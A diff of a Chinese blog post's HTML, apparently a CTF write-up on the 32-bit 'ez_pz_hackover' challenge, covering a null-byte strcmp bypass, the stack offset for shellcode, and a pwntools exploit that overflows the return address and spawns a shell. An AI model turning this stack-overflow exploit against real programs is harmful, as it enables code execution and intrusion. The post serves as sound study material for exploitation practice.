@@ -23,8 +23,11 @@
 <meta property="og:image" content="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617115414.png">
 <meta property="og:image" content="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617120028.png">
 <meta property="og:image" content="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617120350.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617150011.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617150021.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617150417.png">
 <meta property="article:published_time" content="2023-06-17T02:57:04.000Z">
-<meta property="article:modified_time" content="2023-06-17T06:49:38.281Z">
+<meta property="article:modified_time" content="2023-06-17T07:08:22.056Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617105959.png">
@@ -108,12 +111,15 @@
 <p>接下来要做的起始就是绕过strcmp函数和计算shellcode在栈上的偏移了。</p>
 <h1 id="绕过strcmp函数"><a href="#绕过strcmp函数" class="headerlink" title="绕过strcmp函数"></a>绕过strcmp函数</h1><h3 id="strcmp函数的解释"><a href="#strcmp函数的解释" class="headerlink" title="strcmp函数的解释"></a>strcmp函数的解释</h3><p>可以看到strcmp是区分大小写的，并且要校验的字符长度也要相同才行。简而言之，似乎只能老老实实地只输入crashme才能够通过strcmp函数。<br><img src="/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617114632.png" alt="Alt text"><br>但是，由于它是依次比较的，我们可以在它读到crashme之后马上加上字符截断符\x00来截断strcmp继续比较字符，从而实现绕过strcmp函数达到跳转溢出函数vuln的目的<br><img src="/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617115414.png" alt="Alt text"></p>
 <h1 id="计算shellcode在栈上的偏移"><a href="#计算shellcode在栈上的偏移" class="headerlink" title="计算shellcode在栈上的偏移"></a>计算shellcode在栈上的偏移</h1><p>我们打印出了s数组的地址:0xff884fec<br><img src="/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617120028.png" alt="Alt text"></p>
-<h4 id="通过pwndbg运行脚本"><a href="#通过pwndbg运行脚本" class="headerlink" title="通过pwndbg运行脚本"></a>通过pwndbg运行脚本</h4><p>我们可以看到，当把返回地址覆盖为s数组的地址的时候，程序执行流直接运行到了0xff884ffc这个地方，而执行shellcode的地址为:0xff884fd0。<br>因此，覆盖返回地址的s数组地址的偏移应该为:<br>(0xffc - 0xfd0) + (0xffc - 0xfec)= 1c<br><img src="/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617120350.png" alt="Alt text"></p>
+<h4 id="通过pwndbg运行脚本"><a href="#通过pwndbg运行脚本" class="headerlink" title="通过pwndbg运行脚本"></a>通过pwndbg运行脚本</h4><p>我们可以看到，当把返回地址覆盖为s数组的地址的时候，程序执行流直接运行到了0xff884ffc这个地方，而执行shellcode的地址为:0xff884fd0。<br>因此，覆盖返回地址的s数组地址的偏移应该为:<br>(0xffc - 0xfd0) + (0xffc - 0xfec)= 0x1c<br><img src="/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617120350.png" alt="Alt text"><br>所以最终的payload为:<br><img src="/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617150011.png" alt="Alt text"><br><img src="/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617150021.png" alt="Alt text"></p>
+<h3 id="为什么是减0x1c而不是加呢？"><a href="#为什么是减0x1c而不是加呢？" class="headerlink" title="为什么是减0x1c而不是加呢？"></a>为什么是减0x1c而不是加呢？</h3><p>因为eip每执行一个指令其数值都会增加的，也就是说，程序的执行流在栈上是从低地址到高地址的，所以要使eip执行到shellcode这个地方就要让eip指针在栈上往低地址方向移动(即图中的往上的方向)，那么当然要减了。<br><img src="/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617150417.png" alt="Alt text"></p>
 <h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = <span class="title function_">process</span>(<span class="string">&quot;./ez_pz_hackover&quot;</span>)</span><br><span class="line">context.<span class="property">log_level</span> = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io.<span class="title function_">recvuntil</span>(b<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">s_addr = <span class="title function_">int</span>(io.<span class="title function_">recv</span>(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">print<span class="string">&quot;s_addr=&gt;&quot;</span>,<span class="title function_">hex</span>(s_addr)</span><br><span class="line">#shellcode_addr = s_addr + <span class="number">0x1e</span></span><br><span class="line">shellcode_addr = s_addr-<span class="number">0x1c</span></span><br><span class="line">#shellcode_addr = s_addr</span><br><span class="line">print<span class="string">&quot;shellcode_addr=&gt;&quot;</span>,<span class="title function_">hex</span>(shellcode_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = <span class="title function_">asm</span>(shellcraft.<span class="title function_">sh</span>())</span><br><span class="line">print<span class="string">&quot;shellcode=&gt;&quot;</span>,shellcode</span><br><span class="line">#print<span class="string">&quot;shellcode=&gt;&quot;</span>,<span class="title function_">int</span>(shellcode_addr,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#payload = b<span class="string">&quot;crashme&quot;</span></span><br><span class="line">payload = b<span class="string">&quot;crashme\x00&quot;</span>+ b<span class="string">&quot;A&quot;</span>*<span class="number">18</span> + <span class="title function_">p32</span>(shellcode_addr)</span><br><span class="line">#进行栈溢出要填充多少垃圾数据需要自己调试出来。</span><br><span class="line">payload += shellcode</span><br><span class="line">#gdb.<span class="title function_">attach</span>(io,b<span class="string">&quot;b *0x80486E2&quot;</span>)</span><br><span class="line">#<span class="title function_">pause</span>()</span><br><span class="line">io.<span class="title function_">sendlineafter</span>(b<span class="string">&quot;&gt;&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.<span class="title function_">interactive</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h1><p>为什么把返回地址覆盖为s数组的地址程序执行流会直接运行到s数组地址后面的地方而不是从s数组的地址开始执行？</p>
+
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/" data-id="clizn451v000378v92xf4cokj" class="article-share-link">Share</a>
+      <a data-url="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/" data-id="clizyehvq0001ikv94pljgtuq" class="article-share-link">Share</a>
       
       
     </footer>
@@ -121,6 +127,15 @@
   
     
 <nav id="article-nav">
+  
+    <a href="/2023/06/17/32%E4%BD%8Dshellcode%E4%BD%BF%E7%94%A8mprotect%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90%E6%89%A7%E8%A1%8Cshellcode/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          32位shellcode使用mprotect提升权限执行shellcode
+        
+      </div>
+    </a>
   
   
     <a href="/2023/06/13/32%E4%BD%8Dshellcode-%E5%85%B6%E5%AE%9E%E6%98%AF32%E4%BD%8Dsyscall/" id="article-nav-older" class="article-nav-link-wrap">
@@ -162,6 +177,10 @@
       <ul>
         
           <li>
+            <a href="/2023/06/17/32%E4%BD%8Dshellcode%E4%BD%BF%E7%94%A8mprotect%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90%E6%89%A7%E8%A1%8Cshellcode/">32位shellcode使用mprotect提升权限执行shellcode</a>
+          </li>
+        
+          <li>
             <a href="/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/">32位shellcode:绕过strcmp函数和计算shellcode在栈上的偏移。</a>
           </li>
         
@@ -175,10 +194,6 @@
         
           <li>
             <a href="/2023/06/04/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2bss/">32位格式化字符串bss</a>
-          </li>
-        
-          <li>
-            <a href="/2023/06/03/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E4%BF%AE%E6%94%B9%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80/">64位格式化字符串之修改返回地址</a>
           </li>
         
       </ul>
